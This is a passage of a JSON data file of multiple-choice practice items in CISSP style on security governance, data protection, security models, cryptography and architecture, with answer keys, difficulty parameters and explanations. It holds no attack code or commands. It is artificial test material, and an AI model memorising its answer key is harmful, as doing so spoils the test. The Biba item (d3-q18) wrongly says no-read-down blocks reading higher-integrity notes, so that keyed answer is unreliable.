      "stem": "An external auditor recommends that the organization implement job rotation for employees in the IT operations team. Management resists, citing the cost of cross-training. Which argument BEST supports the auditor's recommendation from a security governance perspective?",
      "choices": [
        "Job rotation improves employee satisfaction and reduces turnover, which is the primary security benefit",
        "Job rotation is only required in financial institutions, so the auditor's recommendation is not applicable here",
        "Job rotation reduces the risk of collusion and fraud, detects errors, and limits dependence on single individuals — benefits that often outweigh cross-training costs",
        "Job rotation should be replaced with enhanced background checks, which achieve the same goal at lower cost"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Job rotation is a key fraud prevention and error detection control that also eliminates single points of human dependency. These security benefits frequently justify cross-training costs. It applies across industries, not just finance. Morale improvement is a side benefit, not the primary security rationale. Background checks are a screening control at hire — they don't address ongoing insider threat risk the way rotation does."
    },
    {
      "id": "d1-q37",
      "domain": "1 Security and Risk Management",
      "stem": "A CISO is presenting a security roadmap to the board. She uses the NIST Cybersecurity Framework to structure her presentation, showing current profiles versus target profiles. A board member asks why she chose NIST CSF rather than ISO 27001. What is the MOST accurate distinction to make?",
      "choices": [
        "NIST CSF is a voluntary risk-based framework for communicating cybersecurity posture; ISO 27001 is a certifiable management system standard — both are useful but serve different purposes",
        "ISO 27001 is more comprehensive than NIST CSF and should always be preferred",
        "NIST CSF is mandatory for all US companies; ISO 27001 is optional for international firms",
        "NIST CSF cannot be used alongside ISO 27001 because they have conflicting control objectives"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: NIST CSF is a voluntary risk communication and posture management framework; ISO 27001 is an auditable ISMS standard that leads to certification. Organizations often use both. CSF is not mandatory for all US companies (though federal agencies have related requirements). ISO 27001 is not universally 'better' — the right choice depends on organizational needs. The frameworks are complementary, not conflicting."
    },
    {
      "id": "d1-q38",
      "domain": "1 Security and Risk Management",
      "stem": "During a tabletop exercise, A security team discovers that their BCP assumes the primary and backup data centers will never fail simultaneously. The scenario involves a regional power grid failure affecting both sites. What is the MOST critical finding from this exercise?",
      "choices": [
        "A single geographic assumption in the BCP creates a correlated failure risk that could make both recovery sites unavailable simultaneously",
        "The scenario is unrealistic and does not warrant updating the BCP",
        "The tabletop revealed that the team needs more training on grid infrastructure",
        "The organization should invest in a third data center immediately"
      ],
      "correctIndex": 0,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Geographic or infrastructure correlation is a critical BCP assumption gap. If both sites share the same power grid, a single regional event defeats the redundancy. The BCP must account for correlated failures. The finding is about the plan's assumptions, not team training. A third data center may be one solution, but the finding itself is about the single-point-of-failure assumption. The scenario is exactly the kind of realistic threat that BCPs must address."
    },
    {
      "id": "d1-q39",
      "domain": "1 Security and Risk Management",
      "stem": "An organization's written security policy uses the phrase 'employees must protect sensitive data.' A new analyst interprets this as not applying to contractors. A data breach occurs involving a contractor's unprotected laptop. What governance element is MOST clearly deficient?",
      "choices": [
        "The policy scope definition — it failed to explicitly include all parties (employees, contractors, third parties) who handle sensitive data",
        "The hiring process — background checks should have screened for the contractor's negligence risk",
        "The AUP — contractors should have signed a separate document",
        "The access control system — contractor access should have been technically restricted"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: The policy scope was ambiguous — it referenced 'employees' without defining whether contractors are covered. Policy scope must explicitly enumerate all parties subject to it. Access controls and AUPs are supporting controls, but the root deficiency is that the policy's applicability was unclear. Background checks address hiring risk, not policy ambiguity."
    },
    {
      "id": "d1-q40",
      "domain": "1 Security and Risk Management",
      "stem": "A CISO is reviewing a third-party cloud provider's shared responsibility model. The provider secures the infrastructure layer; the organization is responsible for data classification, access controls, and application security. A breach occurs due to misconfigured cloud object storage bucket ACLs. Under the shared responsibility model, who bears primary accountability?",
      "choices": [
        "The cloud provider, because they control the underlying storage service",
        "The cloud provider's security team, because they should have detected the misconfiguration",
        "Both parties equally, because shared responsibility implies joint ownership of all controls",
        "The customer organization, because misconfigured access controls are within the customer's responsibility boundary"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Access control configuration is explicitly the customer's responsibility in all major cloud shared responsibility models. The provider secures the infrastructure; the customer configures it securely. The provider controls the service itself but not how customers configure permissions. 'Shared responsibility' does not mean equal accountability for all controls — each layer has a defined owner. The provider may offer detective tools, but the customer is accountable for their configuration choices."
    },
    {
      "id": "d2-q14",
      "domain": "2 Asset Security",
      "stem": "A European marketing firm collects customer behavioral data on behalf of its clients. The firm processes and analyzes the data but does not determine the purpose of collection. Under GDPR, how should the firm be classified, and what is the PRIMARY implication?",
      "choices": [
        "Data processor — the firm must act only on documented controller instructions and cannot use the data for its own purposes",
        "Data controller — the firm determines how data is used and bears full accountability for subject rights",
        "Joint controller — the firm shares equal responsibility for all data subject rights with its clients",
        "Data sub-processor — the firm has no direct GDPR obligations because it is downstream of the controller"
      ],
      "correctIndex": 0,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: A data processor processes data on behalf of a controller and cannot use the data for its own purposes. The clients (who determine the purpose and means of processing) are controllers. As a processor, the firm must follow documented controller instructions, implement appropriate security, and notify the controller of breaches. It has direct GDPR obligations (Article 28 DPA required), but accountability for data subject rights lies primarily with the controller."
    },
    {
      "id": "d2-q15",
      "domain": "2 Asset Security",
      "stem": "A healthcare provider wants to share patient outcome data with a research university. Legal counsel recommends anonymization. The IT team proposes replacing patient names with random IDs (pseudonymization). What is the MOST important distinction the security team should clarify?",
      "choices": [
        "Either technique satisfies HIPAA's de-identification safe harbor without further analysis",
        "Anonymization is reversible using advanced analytics, so pseudonymization is the stronger protection",
        "Pseudonymization is reversible and the data remains personal data under privacy law; true anonymization removes all re-identification paths and removes it from personal data regulation",
        "Pseudonymization and anonymization are legally equivalent as long as the key is stored separately"
      ],
      "correctIndex": 2,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Pseudonymization replaces identifiers but retains the ability to re-link — it is still considered personal data under GDPR and HIPAA. True anonymization eliminates all re-identification paths and removes data from personal data scope. They are not legally equivalent. Pseudonymization is not a stronger protection — it's a weaker de-identification technique. HIPAA safe harbor requires either expert determination or specific identifier removal; pseudonymization alone doesn't satisfy it without more analysis."
    },
    {
      "id": "d2-q16",
      "domain": "2 Asset Security",
      "stem": "An asset disposition manager at a defense contractor must destroy a batch of retired SSDs containing classified data. The SSDs use hardware-based full-disk encryption. Which disposal method MOST ensures data is unrecoverable?",
      "choices": [
        "Standard disk formatting followed by overwriting with random data three times",
        "Degaussing the SSDs, which is the NSA-approved method for all storage media",
        "Key destruction alone is sufficient for classified data on encrypted SSDs",
        "Cryptographic erasure (key destruction) followed by physical destruction of the media"
      ],
      "correctIndex": 3,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: For classified data, cryptographic erasure (destroying the encryption key) renders data unreadable, but physical destruction provides defense-in-depth assurance that no hardware-level recovery is possible. NIST 800-88 and NSA/CSS guidance for classified media requires physical destruction. Overwriting SSDs with random data is unreliable because of wear-leveling algorithms. Key destruction alone may satisfy some standards but not NSA classified media requirements. Degaussing doesn't work on SSDs (no magnetic media) — a critical distinction."
    },
    {
      "id": "d2-q17",
      "domain": "2 Asset Security",
      "stem": "An organization classifies data into four levels: Public, Internal, Confidential, and Restricted. A data owner wants to downgrade a Restricted dataset to Confidential because it's easier to share with business partners. What process should PRIMARILY govern this decision?",
      "choices": [
        "An automated DLP tool scan that reassigns classification based on content keywords",
        "IT's discretion — the security team sets and controls all classification levels",
        "A formal reclassification review that assesses current sensitivity, regulatory requirements, and business need, approved by the data owner and security",
        "The data owner's discretion — owners have final authority over their data's classification"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Reclassification requires a formal review process — not unilateral decision. The review must assess whether sensitivity has genuinely changed, whether regulatory or contractual obligations require the current classification, and must be approved by appropriate authority. Data owners have custodial authority, but not unlimited override of classification policy. IT/security teams enforce policy but don't arbitrarily set business-driven classifications. DLP tools can flag content but cannot make governance decisions."
    },
    {
      "id": "d2-q18",
      "domain": "2 Asset Security",
      "stem": "A data steward is implementing a retention schedule. Legal holds 7 years for financial records, IT wants to minimize storage costs, and business units want to keep everything indefinitely. What should drive the retention schedule PRIMARILY?",
      "choices": [
        "A uniform 10-year retention policy applied to all data to simplify administration",
        "Legal and regulatory requirements set the floor; business need determines whether to retain longer, balanced against storage and risk costs",
        "IT's storage cost budget, because data has no value after its operational use period",
        "Business unit preference, because they are the data owners and have final authority"
      ],
      "correctIndex": 1,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Legal/regulatory requirements are the non-negotiable floor for retention. Business need may extend retention beyond the minimum, but that must be weighed against storage cost and the risk that retained data creates (e-discovery exposure, breach impact). IT storage cost can't override legal requirements. Business units don't have unconstrained authority to override legal holds. A uniform 10-year policy ignores that different data types have different legal retention requirements."
    },
    {
      "id": "d2-q19",
      "domain": "2 Asset Security",
      "stem": "During a merger, an acquiring company discovers the target stores employee Social Security numbers in a shared folder accessible to all staff. The data is correctly classified as Restricted. What is the PRIMARY control failure?",
      "choices": [
        "The classification label is wrong — data this broadly accessible should be reclassified to Internal",
        "The data should be deleted immediately since storing SSNs creates unnecessary liability",
        "Access controls are not aligned to the data's classification — Restricted data requires need-to-know access, not broad share permissions",
        "The folder should be encrypted — encryption is the required control for Restricted data"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Classification is meaningless without access controls to enforce it. Restricted data requires need-to-know access restriction — broad shared folder access is a fundamental control misalignment. Reclassifying data downward to match poor access controls inverts the security hierarchy. Encryption is important but doesn't address the authorization problem. Deleting the data may or may not be appropriate — it depends on whether the organization has a legitimate need to retain SSNs."
    },
    {
      "id": "d2-q20",
      "domain": "2 Asset Security",
      "stem": "A DLP system flags an email containing a spreadsheet with 200 credit card numbers being sent externally. The sender claims it was an accidental attachment. What should the organization's DLP policy response FIRST involve?",
      "choices": [
        "Allow the email to send because blocking may disrupt a legitimate business need",
        "Automatically block and quarantine the email pending review, then trigger the incident response process including breach assessment",
        "Delete the email from all systems immediately to prevent further exposure",
        "Send an automated warning to the user and allow them to override the block if they attest it is business-justified"
      ],
      "correctIndex": 1,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: The immediate action is to block and quarantine — stop the data from leaving — then invoke IR to assess whether a reportable breach has occurred. DLP's primary function is prevention. Allowing the send defeats the purpose of DLP. Immediate deletion could destroy evidence needed for breach investigation. Self-attestation override on PCI-data in flight is an inappropriate exception path; credit card numbers are strictly regulated."
    },
    {
      "id": "d2-q21",
      "domain": "2 Asset Security",
      "stem": "An analyst is scoping a PCI DSS assessment. The cardholder data environment (CDE) currently shares network segments with HR and finance systems. The QSA recommends network segmentation to reduce scope. Management asks for the BEST reason to invest in segmentation beyond the audit.",
      "choices": [
        "Segmentation is required by PCI DSS so there is no need for further justification",
        "Segmentation will eliminate all PCI DSS compliance obligations once implemented",
        "Segmentation reduces the attack surface — a compromise in HR or finance cannot pivot laterally to cardholder data, and reduces the cost and complexity of future compliance audits",
        "Segmentation is primarily a performance optimization that has a secondary security benefit"
      ],
      "correctIndex": 2,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Segmentation provides defense-in-depth by containing lateral movement AND reduces audit scope and cost — a dual security and business benefit. PCI DSS recommends but doesn't strictly mandate segmentation; it's a scope-reduction strategy. Segmentation reduces compliance burden but doesn't eliminate PCI obligations if card data is still processed. Segmentation's primary driver in this context is security and scope management, not performance."
    },
    {
      "id": "d2-q22",
      "domain": "2 Asset Security",
      "stem": "A cloud migration project moves on-premises databases to a managed cloud database service. The database contains trade secrets. The security architect must choose between customer-managed keys (CMK) and provider-managed keys. What is the MOST important consideration?",
      "choices": [
        "Provider-managed keys are always more secure because the cloud provider has more expertise in key management",
        "CMK gives the organization control over key lifecycle and the ability to revoke access immediately; provider-managed keys mean the provider could theoretically decrypt data under legal compulsion",
        "The choice doesn't matter — both options provide identical security guarantees under encryption",
        "CMK increases liability because the organization bears full responsibility for key availability"
      ],
      "correctIndex": 1,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: CMK gives the organization sovereign control — they can revoke access, audit usage, and prevent the provider from accessing data under subpoena without their knowledge. Provider-managed keys mean the provider holds the keys and could be compelled to decrypt. Provider expertise doesn't change the trust boundary question. Both options use encryption, but control of the keys is the critical security differentiator. CMK does create operational responsibility, but for trade secrets, that tradeoff is typically justified."
    },
    {
      "id": "d2-q23",
      "domain": "2 Asset Security",
      "stem": "An organization's data inventory reveals that 40% of its sensitive data is stored in shadow IT systems not tracked by IT. These systems were created by business units to solve workflow problems. What is the MOST appropriate first step?",
      "choices": [
        "Immediately shut down all shadow IT systems to eliminate the compliance risk",
        "Conduct a discovery and inventory exercise to identify all shadow systems, then assess their risk before determining remediation",
        "Penalize the business units that created shadow IT systems to deter future violations",
        "Retroactively approve shadow systems since business units depend on them"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Correct Answer: You can't manage what you don't know — discovery and inventory come first. After understanding what exists, risk assessment determines which systems pose the most concern. Immediate shutdown without assessment could disrupt critical business processes and lose data. Blanket approval ignores security and compliance risks. Penalties address behavior but not the immediate risk from existing systems."
    },
    {
      "id": "d2-q24",
      "domain": "2 Asset Security",
      "stem": "An organization stores backup tapes off-site at a third-party facility. The tapes contain unencrypted PII. During contract renewal, the facility cannot provide SOC 2 Type II evidence or agree to security audit rights. What should the security professional recommend?",
      "choices": [
        "Accept the risk because physical off-site storage is inherently more secure than cloud storage",
        "Encrypt all backup tapes immediately and negotiate security audit rights or transition to a compliant vendor",
        "Continue the relationship because changing vendors creates operational disruption",
        "Remove all PII from backup tapes to simplify the vendor risk issue"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Unencrypted PII in off-site storage with a non-auditable vendor represents dual risks: data exposure and third-party compliance gap. Immediate encryption protects the data regardless of vendor posture; audit rights or vendor transition address the governance gap. Physical security is not inherently superior — unencrypted tapes can be copied without detection. Operational disruption is a cost, not a reason to accept unmanaged risk. Removing PII from backups may not be operationally feasible and doesn't address current exposure."
    },
    {
      "id": "d2-q25",
      "domain": "2 Asset Security",
      "stem": "During scoping for a new system, an architect proposes collecting full birthdates, SSNs, and mother's maiden name for identity verification. A privacy officer argues that only the last four digits of SSN and a birthdate are needed. Which principle does the privacy officer invoke?",
      "choices": [
        "Data minimization — collect only the minimum data necessary for the stated purpose",
        "Purpose limitation — data collected for one purpose cannot be used for another",
        "Data classification — all PII must be classified before collection",
        "Data sovereignty — collect data only in approved jurisdictions"
      ],
      "correctIndex": 0,
      "difficulty": -0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: The privacy officer is applying data minimization — the principle that only data strictly necessary for the defined purpose should be collected. Collecting full SSNs and mother's maiden name when only partial SSN and birthdate are needed exceeds the minimum. Data sovereignty relates to geographic storage jurisdiction. Classification is a handling concept, not a collection limitation. Purpose limitation prevents secondary use, but the issue here is collection volume, not secondary purpose."
    },
    {
      "id": "d2-q26",
      "domain": "2 Asset Security",
      "stem": "A company wants to provide its data analytics team with a production customer dataset for model training. The legal team has approved the project if the data is properly de-identified. The analytics team proposes k-anonymity with k=3 applied to quasi-identifiers. The privacy team notes that the dataset contains rare demographic combinations. What is the PRIMARY residual risk?",
      "choices": [
        "The risk is eliminated because legal counsel approved the approach",
        "k-anonymity with k=3 is mathematically proven to prevent all re-identification",
        "The analytics team should use k=5 instead, which provides absolute protection",
        "With rare demographic combinations, even k=3 may allow re-identification through intersection attacks or background knowledge, making the de-identification insufficient"
      ],
      "correctIndex": 3,
      "difficulty": 0.8,
      "discrimination": 1.2,
      "explanation": "Correct Answer: k-anonymity with k=3 means each record is indistinguishable from at least 2 others on quasi-identifiers — but rare demographic combinations shrink groups below meaningful protection. Background knowledge attacks can re-identify individuals even in k-anonymous datasets. Higher k reduces (but doesn't eliminate) this risk. Legal approval doesn't substitute for technical de-identification assessment. No fixed k value provides absolute protection — l-diversity and t-closeness address some of k-anonymity's residual risks."
    },
    {
      "id": "d3-q17",
      "domain": "3 Security Architecture and Engineering",
      "stem": "Under the Bell-LaPadula model, a subject cleared at the Secret level attempts to READ a Top Secret document and WRITE data to an Unclassified log file. Which operations does the model permit?",
      "choices": [
        "Neither — reading up (Secret reading Top Secret) violates the simple security property, and writing down (Secret writing to Unclassified) violates the *-property",
        "Read only — the simple security property allows reading at any level, only write is restricted",
        "Write only — the *-property restricts reading up but permits writing at any level",
        "Both — a Secret clearance allows access to all classification levels below Top Secret"
      ],
      "correctIndex": 0,
      "difficulty": 0.4,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Bell-LaPadula enforces two core rules: (1) Simple security property — no read up: a Secret subject cannot read Top Secret objects. (2) *-property (star-property) — no write down: a Secret subject cannot write to Unclassified objects, to prevent leaking classified information to lower levels. Both operations in this scenario violate BLP rules. The model is designed to prevent downward information flow — it prioritizes confidentiality."
    },
    {
      "id": "d3-q18",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A security architect is designing access controls for a medical records system where nurses must write treatment notes but should not read notes written by physicians for specialist consultations. Which integrity model BEST maps to this requirement?",
      "choices": [
        "Brewer-Nash — the Chinese Wall prevents conflicts of interest, which applies to competing patient data",
        "Biba — the model's no-read-down rule prevents nurses from reading higher-integrity physician notes if physicians are assigned higher integrity levels",
        "Bell-LaPadula — the confidentiality model prevents unauthorized read access across classification levels",
        "Clark-Wilson — the model enforces well-formed transactions that would satisfy both read and write restrictions"
      ],
      "correctIndex": 1,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Biba is an integrity model where subjects cannot read from lower-integrity objects (no-read-down) and cannot write to higher-integrity objects (no-write-up). If physicians have higher integrity ratings, nurses (lower integrity) cannot read physician notes — directly matching the requirement. BLP is a confidentiality model and doesn't address this integrity use case. Clark-Wilson enforces transaction integrity via access triples but doesn't naturally create the hierarchical read restriction described. Brewer-Nash prevents conflict-of-interest access, not hierarchical integrity."
    },
    {
      "id": "d3-q19",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A financial firm implements Clark-Wilson model controls for its trading system. An auditor asks how the model ensures data integrity. Which description is MOST accurate?",
      "choices": [
        "Clark-Wilson ensures that subjects at higher integrity levels cannot contaminate lower integrity data",
        "Clark-Wilson uses access triples (subject-program-object) requiring all data modifications to occur through certified transformation procedures, ensuring only well-formed transactions alter constrained data items",
        "Clark-Wilson creates dynamic conflict-of-interest rules that change as subjects access different data sets",
        "Clark-Wilson uses mandatory labels to prevent subjects from reading data above their clearance level"
      ],
      "correctIndex": 1,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Clark-Wilson enforces integrity through access triples: a subject can only manipulate a Constrained Data Item (CDI) through an authorized Transformation Procedure (TP) — essentially enforcing that all changes go through certified programs. This prevents unauthorized or malformed modifications. Mandatory labels describe BLP/Biba. No-read/write restrictions describe Biba. Conflict-of-interest rules describe Brewer-Nash (Chinese Wall)."
    },
    {
      "id": "d3-q20",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A consultant at an investment bank advises clients in competing sectors. After advising a semiconductor client, the Brewer-Nash model would restrict the consultant's access to data from which category?",
      "choices": [
        "The consultant's own historical project files from unrelated engagements",
        "Any other semiconductor company that competes with the current client — the Chinese Wall rule prevents access to data from the same conflict-of-interest class",
        "All financial data across the entire bank, regardless of sector",
        "Public market data that is available to all clients"
      ],
      "correctIndex": 1,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: The Brewer-Nash (Chinese Wall) model dynamically restricts access based on prior access history. Once the consultant accesses semiconductor company A's data, they cannot access data from other companies in the same conflict-of-interest class (competing semiconductor companies). It doesn't restrict unrelated sectors, personal historical files, or public data — only competing entities in the same class."
    },
    {
      "id": "d3-q21",
      "domain": "3 Security Architecture and Engineering",
      "stem": "An HSM (Hardware Security Module) is being evaluated for a PKI root CA. Which property of an HSM makes it the MOST appropriate choice for root CA key storage?",
      "choices": [
        "Lower cost compared to software key stores, making it budget-friendly for CA deployment",
        "Tamper-evident and tamper-resistant design that zeroizes keys if physical intrusion is detected, combined with FIPS 140-2 Level 3 or higher validation",
        "Network-accessible API that allows rapid key retrieval for high-throughput signing operations",
        "HSMs automatically rotate CA keys, eliminating the need for manual key management procedures"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: The defining properties for root CA key protection are tamper resistance (physical attack triggers key destruction) and FIPS validation, ensuring the private key never exists in plaintext outside the HSM and is destroyed if compromised. Network accessibility is a throughput feature, not a security property — root CAs are typically kept offline. HSMs are expensive, not cheaper. HSMs don't automatically rotate CA keys; that requires explicit ceremony and procedure."
    },
    {
      "id": "d3-q22",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A cloud architect is designing a multi-tenant SaaS platform. Security reviews flag the risk of a tenant breaking out of their isolated container to access another tenant's data. What architectural control MOST directly mitigates VM/container escape risk?",
      "choices": [
        "Requiring tenants to sign contractual SLAs that prohibit unauthorized access",
        "Encrypting all inter-tenant traffic with TLS to prevent eavesdropping",
        "Deploying an IDS to detect anomalous container behavior post-exploitation",
        "Hypervisor-level isolation with separate VMs per tenant, combined with hardened container runtimes and no shared kernel namespaces between tenants"
      ],
      "correctIndex": 3,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: VM/container escape attacks target shared kernel or hypervisor vulnerabilities. Hypervisor-level VM isolation (separate VMs, not just containers) with hardened runtimes reduces the shared attack surface — containers sharing a kernel are more vulnerable. TLS protects data in transit but not memory isolation. Contractual controls are non-technical and unenforceable at runtime. IDS is a detective control that detects after the fact; architectural isolation is preventive."
    },
    {
      "id": "d3-q23",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A security architect is implementing a zero-trust network for a distributed workforce. A developer questions why internal users face the same authentication requirements as external users. What is the MOST accurate justification for the zero-trust approach?",
      "choices": [
        "Zero trust assumes no implicit trust based on network location — insider threats and lateral movement after perimeter breach mean internal traffic must be verified continuously",
        "Zero trust eliminates the need for perimeter security by replacing it with internal segmentation alone",
        "Zero trust is a compliance requirement under all major frameworks, making internal authentication legally required",
        "Internal authentication requirements increase infrastructure cost but are mandatory per NIST SP 800-207"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Zero trust's core principle is 'never trust, always verify' — network location (inside vs. outside perimeter) confers no implicit trust. Internal users could be compromised accounts or insider threats. NIST SP 800-207 provides zero-trust architecture guidance but doesn't universally mandate it for all organizations. Zero trust adds cost but cost is not the primary driver; security posture is. Zero trust enhances, not eliminates, perimeter security — defense in depth uses both."
    },
    {
      "id": "d3-q24",
      "domain": "3 Security Architecture and Engineering",
      "stem": "An application processes credit card transactions and must meet FIPS 140-2 requirements. The development team proposes using AES-128 implemented in a software module. A security reviewer questions the FIPS compliance status. What is the PRIMARY concern?",
      "choices": [
        "AES-128 is not approved under FIPS 140-2; only AES-256 meets the standard",
        "Software modules cannot achieve FIPS 140-2 compliance; only hardware modules qualify",
        "FIPS 140-2 compliance is automatically satisfied when using any NIST-approved algorithm like AES",
        "Software cryptographic modules require FIPS 140-2 validation of the specific implementation, not just the algorithm — using AES-128 in unvalidated software does not satisfy FIPS requirements"
      ],
      "correctIndex": 3,
      "difficulty": 0.6,
      "discrimination": 1.15,
      "explanation": "Correct Answer: FIPS 140-2 validates the entire cryptographic module — its implementation, key management, physical security, and operational behavior — not just the algorithm. An unvalidated software module using AES-128 does not satisfy FIPS requirements. AES-128 is FIPS-approved (AES with 128, 192, or 256-bit keys). Software modules CAN achieve FIPS 140-2 Level 1 and 2 validation. Using a NIST-approved algorithm in an unvalidated module does not meet FIPS requirements."
    },
    {
      "id": "d3-q25",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A side-channel attack is discovered against an AES implementation in a smart card. The attack recovers key material by measuring power consumption during encryption. Which defense MOST directly mitigates this specific attack class?",
      "choices": [
        "Adding a digital signature to validate the integrity of encryption outputs",
        "Implementing TLS to encrypt the communication channel between the smart card and reader",
        "Increasing the AES key length from 128 to 256 bits",
        "Power analysis countermeasures such as random power draw masking, constant-time execution, and hardware noise injection"
      ],
      "correctIndex": 3,
      "difficulty": 0.7,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Simple and Differential Power Analysis (SPA/DPA) side-channel attacks measure physical characteristics (power draw, timing, EM emissions) to extract key material. Countermeasures target the physical leakage: randomizing power consumption (masking), ensuring constant-time execution to prevent timing variations, and hardware noise injection. Increasing key length doesn't address physical leakage. TLS protects the channel but not the physical cryptographic computation. Digital signatures verify integrity, not confidentiality of key material."
    },
    {
      "id": "d3-q26",
      "domain": "3 Security Architecture and Engineering",
      "stem": "An ICS/SCADA environment runs safety-critical PLCs that cannot be patched or rebooted without a planned maintenance window months away. A vulnerability is disclosed affecting the PLC firmware. What is the MOST appropriate interim control?",
      "choices": [
        "Replace the affected PLCs with newer models that support the patch",
        "Accept the risk with no action until the scheduled maintenance window",
        "Apply the vendor patch immediately despite the maintenance window restriction",
        "Implement network-level compensating controls — isolate affected PLCs from untrusted networks, apply industrial firewall rules to whitelist only required protocols, and increase monitoring"
      ],
      "correctIndex": 3,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: When patching is not immediately possible in OT/ICS environments, compensating controls at the network layer are the appropriate interim measure: network isolation, strict protocol whitelisting, and enhanced monitoring. Patching without authorization in safety-critical environments risks causing operational failures worse than the vulnerability. Pure risk acceptance without compensating controls is inappropriate when network mitigations are available. Replacing PLCs is a long-term option, not an interim control."
    },
    {
      "id": "d3-q27",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A Common Criteria evaluation at EAL4 is proposed for a network security appliance. A buyer asks what EAL4 assurance guarantees. Which response is MOST accurate?",
      "choices": [
        "EAL4 is the highest available assurance level and indicates government-grade security",
        "EAL4 confirms the product was methodically designed, tested, and reviewed — it assures the security functions work as specified, not that the product is free of all vulnerabilities",
        "EAL4 means the product has been tested against all current CVEs and found unaffected",
        "EAL4 guarantees the product cannot be compromised by any known attack"
      ],
      "correctIndex": 1,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: EAL4 (Evaluated Assurance Level 4) represents 'methodically designed, tested, and reviewed' — it provides assurance that the product behaves according to its security target under evaluation conditions. It does not guarantee freedom from all vulnerabilities. EAL7 is the highest level. EAL doesn't involve CVE testing. EAL4 is used commercially; EAL6-7 are for government/military grade applications."
    },
    {
      "id": "d3-q28",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A developer argues that defense-in-depth is unnecessary overhead because the organization already has a next-generation firewall with deep packet inspection. A security architect disagrees. What is the MOST compelling counter-argument?",
      "choices": [
        "The developer is correct — an NGFW with DPI eliminates the need for layered controls",
        "A single control, however sophisticated, has a failure mode — defense-in-depth ensures that exploitation of one layer doesn't lead directly to full compromise",
        "Next-generation firewalls are insufficient and should be replaced with multiple simpler firewalls",
        "Defense-in-depth is only required for organizations subject to NIST 800-53 controls"
      ],
      "correctIndex": 1,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Every control has failure modes — misconfiguration, zero-days, bypasses. Defense-in-depth ensures an attacker must defeat multiple independent layers. A single sophisticated control creates a single point of failure. The argument isn't about replacing the NGFW but about adding layers beyond it. Defense-in-depth is a security principle, not a compliance requirement limited to NIST frameworks. The developer's position is a single-point-of-failure architecture."
    },
    {
      "id": "d3-q29",
      "domain": "3 Security Architecture and Engineering",
      "stem": "During cryptographic key ceremony planning for a new enterprise CA, the key management team debates how many key custodians are needed to reconstruct the root CA private key. The security architect recommends a 3-of-5 secret sharing scheme. What does this scheme accomplish?",
      "choices": [
        "Any 3 of 5 custodians must be present to reconstruct the key, providing resilience against custodian unavailability while requiring collusion of at least 3 people to misuse the key",
        "The scheme means 3 custodians hold real key shares and 2 hold decoy shares",
        "The key is split into 5 parts and the first 3 parts are sufficient because the last 2 are redundant",
        "All 5 custodians must be present simultaneously for all root CA operations"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Shamir's Secret Sharing (m-of-n) means any m of n shareholders can reconstruct the secret. 3-of-5 means any 3 custodians can reconstruct the key — if 2 are unavailable, the key can still be recovered. It also means collusion requires at least 3 people. All 5 present would be a 5-of-5 scheme. The shares are mathematically independent — there are no 'redundant' or 'decoy' shares; all 5 shares are equally valid partial secrets."
    },
    {
      "id": "d3-q30",
      "domain": "3 Security Architecture and Engineering",
      "stem": "An architect proposes hosting a web application behind a WAF, with the application server in a DMZ, and the database behind an internal firewall. A reviewer suggests adding TLS termination at the WAF rather than end-to-end TLS. What is the PRIMARY security tradeoff?",
      "choices": [
        "WAF TLS termination is always superior because WAF inspection is more valuable than encryption",
        "End-to-end TLS is always superior and WAF TLS termination should never be used",
        "The placement of TLS termination has no meaningful security difference in a properly configured DMZ",
        "WAF TLS termination allows content inspection for attacks but creates a decryption point where traffic is plaintext between WAF and app server — end-to-end TLS maintains encryption throughout but blinds the WAF"
      ],
      "correctIndex": 3,
      "difficulty": 0.4,
      "discrimination": 1.1,
